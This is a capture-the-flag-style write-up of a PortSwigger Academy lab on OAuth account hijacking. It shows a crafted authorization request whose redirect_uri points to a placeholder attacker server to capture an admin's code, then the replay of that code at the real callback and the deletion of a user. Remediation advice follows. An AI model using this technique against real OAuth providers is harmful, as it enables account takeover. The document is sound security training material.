# 🎯 OAuth Account Hijacking via `redirect_uri`

![Vuln](https://img.shields.io/badge/vuln-OAuth%20Misconfiguration-red)
![Severity](https://img.shields.io/badge/severity-high-orange)
![Platform](https://img.shields.io/badge/platform-PortSwigger%20Academy-blue)
![Status](https://img.shields.io/badge/status-solved-success)

A hands-on walkthrough of PortSwigger Web Security Academy's **"OAuth account hijacking via redirect_uri"** lab — exploiting weak `redirect_uri` validation to redirect an administrator's OAuth authorization code to an attacker-controlled exploit server, then using the stolen code to access the admin account and delete `carlos`.

## Summary

The OAuth provider accepts an attacker-controlled `redirect_uri` instead of restricting redirects to a registered callback URL.

That turns the authorization-code flow into an account-takeover primitive:

```text
Admin's active OAuth session
            |
            v
Attacker-controlled redirect_uri
            |
            v
Authorization code leaked
            |
            v
Legitimate /oauth-callback
            |
            v
Admin session
            |
            v
/admin
            |
            v
Delete carlos
```

The lab was successfully solved.

## Lab Environment

| Component | Value |
|---|---|
| Lab | OAuth account hijacking via redirect_uri |
| Platform | PortSwigger Web Security Academy |
| Credentials | `wiener:peter` |
| OAuth flow | Authorization Code |
| Client callback | `/oauth-callback` |
| Objective | Hijack the admin account and delete `carlos` |

> Lab hosts, authorization codes, cookies, and exploit-server URLs are ephemeral. Sensitive per-session values are intentionally not preserved here.

## Recon — Normal OAuth Flow

I first logged in normally with the supplied credentials and inspected the OAuth traffic in Burp Suite.

The authorization request follows this structure:

```http
GET /auth?client_id=CLIENT_ID&redirect_uri=https://TARGET-LAB-HOST/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/2
Host: OAUTH-SERVER
```

After authorization, the OAuth provider returns a redirect containing the authorization code:

```http
HTTP/2 302 Found
X-Powered-By: Express
Pragma: no-cache
Cache-Control: no-cache, no-store
Location: https://TARGET-LAB-HOST/oauth-callback?code=AUTHORIZATION_CODE
```

The important observation is that the **authorization code is delivered through the `redirect_uri`**.

## Vulnerability — `redirect_uri` Validation

The security boundary is the `redirect_uri` parameter.

A secure OAuth provider should only redirect to previously registered callback URLs. If arbitrary destinations are accepted, an attacker can replace the legitimate callback with an endpoint they control.

The vulnerable request conceptually becomes:

```http
GET /auth?client_id=CLIENT_ID&redirect_uri=https://ATTACKER-EXPLOIT-SERVER/&response_type=code&scope=openid%20profile%20email HTTP/2
Host: OAUTH-SERVER
```

Instead of rejecting the request, the vulnerable OAuth provider accepts the attacker-controlled callback.

When the victim authorizes the request, the provider redirects the authorization code to the attacker's server:

```http
HTTP/2 302 Found
Location: https://ATTACKER-EXPLOIT-SERVER/?code=ADMIN_AUTHORIZATION_CODE
```

That is the core bug.

## Exploitation

The lab provides an exploit server and states that the administrator will open anything hosted there while maintaining an active OAuth session.

The attack therefore works without knowing the administrator's password.

### 1. Build the malicious OAuth request

Start with the legitimate authorization request and replace the trusted callback with the exploit server.

```text
redirect_uri=https://ATTACKER-EXPLOIT-SERVER/
```

The important parameters remain:

```text
client_id      → legitimate OAuth client
redirect_uri   → attacker-controlled server
response_type  → code
scope          → openid profile email
```

### 2. Deliver the request to the administrator

The malicious OAuth request is placed on the PortSwigger exploit server and delivered to the simulated victim.

```text
Attacker
   |
   v
Exploit Server
   |
   | malicious OAuth authorization request
   v
Administrator Browser
   |
   | active OAuth session
   v
OAuth Provider
```

Because the administrator is already authenticated with the OAuth provider, the provider generates an authorization code associated with the **administrator's account**.

### 3. Capture the authorization code

The provider follows the attacker-controlled `redirect_uri`:

```text
https://ATTACKER-EXPLOIT-SERVER/?code=ADMIN_AUTHORIZATION_CODE
```

The authorization code is now visible in the exploit server's access log.

This is the critical transition:

```text
Admin OAuth session
      |
      v
Admin authorization code
      |
      v
Attacker-controlled redirect_uri
      |
      v
Attacker receives code
```

### 4. Send the code to the legitimate callback

Instead of leaving the code at the attacker's server, the stolen code is supplied to the application's legitimate OAuth callback:

```text
https://TARGET-LAB-HOST/oauth-callback?code=STOLEN_ADMIN_CODE
```

The client processes the authorization code through the normal OAuth flow and creates an authenticated application session for the account associated with that code.

Because the code belongs to the administrator, the resulting session is privileged.

## Admin Account Takeover

After replaying the stolen authorization code through the legitimate callback, the application exposes the administrative panel.

The admin page initially contained:

```text
Users

carlos - Delete
wiener - Delete
```

This confirms that the stolen OAuth code resulted in an **administrator-level session** rather than the attacker's own account.

## Impact — Delete `carlos`

With administrator access, the final step was to delete `carlos` from the admin panel.

The application returned:

```text
User deleted successfully!
```

The resulting user list contained only:

```text
wiener - Delete
```

PortSwigger then displayed:

```text
Congratulations, you solved the lab!
```

**Lab status: SOLVED ✅**

## Complete Exploitation Chain

```text
Normal OAuth flow
        |
        v
Identify redirect_uri
        |
        v
Replace callback with exploit server
        |
        v
Admin opens malicious OAuth request
        |
        v
OAuth provider authenticates Admin
        |
        v
Authorization code generated for Admin
        |
        v
Code redirected to attacker
        |
        v
Capture code from exploit-server log
        |
        v
Replay code at legitimate /oauth-callback
        |
        v
Admin session obtained
        |
        v
Access /admin
        |
        v
Delete carlos
        |
        v
LAB SOLVED
```

## Why It Works

The authorization code is not merely a random value. It represents the result of the OAuth authorization performed by the currently authenticated user.

The application therefore trusts the identity represented by the code.

The vulnerability lets the attacker control **where that code is delivered**.

```text
Secure:
OAuth Provider ──> Registered Callback

Vulnerable:
OAuth Provider ──> Attacker Callback ──> Stolen Code
```

The account takeover happens because these two conditions are combined:

1. The victim has an active OAuth session.
2. The OAuth provider accepts an attacker-controlled `redirect_uri`.

## Root Cause

**Insufficient validation of the OAuth `redirect_uri`.**

The provider must not trust a callback supplied by the requester. It should compare the requested URI against a strict set of registered redirect URIs.

Bad validation patterns include:

- Prefix matching
- Substring matching
- Loose regular expressions
- Host-only validation
- Accepting arbitrary subdomains
- Allowing user-controlled callback destinations

The security property should be:

```text
Requested redirect_uri
          ==
Registered redirect_uri
```

## Remediation

- Register exact callback URLs for every OAuth client.
- Require an exact match for `redirect_uri` during authorization.
- Validate the same `redirect_uri` during the authorization-code exchange where applicable.
- Use the OAuth `state` parameter to protect the authorization request from CSRF.
- Use PKCE where appropriate, especially for public clients.
- Keep authorization codes short-lived and single-use.
- Never allow arbitrary or loosely validated redirect destinations.

## Key Takeaways

- `redirect_uri` is a **critical OAuth security boundary**.
- An authorization code can act as a temporary credential for the authenticated OAuth user.
- Redirecting that code to an attacker-controlled endpoint can lead to account takeover.
- The victim does not need to enter their password for the attack to work; an existing OAuth session is enough.
- `state` is important for OAuth request integrity, but it does not compensate for accepting an attacker-controlled callback.
- The primary defense is **strict allowlisting and exact validation of registered redirect URIs**.

## References

- [PortSwigger — OAuth authentication](https://portswigger.net/web-security/oauth)
- [PortSwigger — OAuth vulnerabilities](https://portswigger.net/web-security/oauth)
- [RFC 6749 — The OAuth 2.0 Authorization Framework](https://www.rfc-editor.org/rfc/rfc6749)

---

<p align="center">
  <sub>Write-up by <strong>Sepehr Abolhasan</strong> · Lab: PortSwigger Web Security Academy · For educational purposes on a public training platform</sub>
</p>
